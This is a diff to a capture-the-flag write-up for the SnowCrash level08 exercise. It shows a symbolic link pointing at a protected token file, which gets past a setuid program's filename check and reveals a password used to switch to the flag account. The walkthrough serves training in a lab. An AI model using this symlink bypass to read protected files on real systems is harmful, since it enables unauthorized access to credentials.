@@ -51,9 +51,12 @@ We can use symbolic links: </br>
 level08@SnowCrash:~$ ln -s ~/token /tmp/link
 level08@SnowCrash:~$ ./level08 /tmp/link
 quif5eloekouj29ke0vouxean
+```
+And then connect to level09
+```bash
 level08@SnowCrash:~$ su flag08
 Password:
 Don't forget to launch getflag !
 flag08@SnowCrash:~$ getflag
-Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXX
+Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXX
 ```
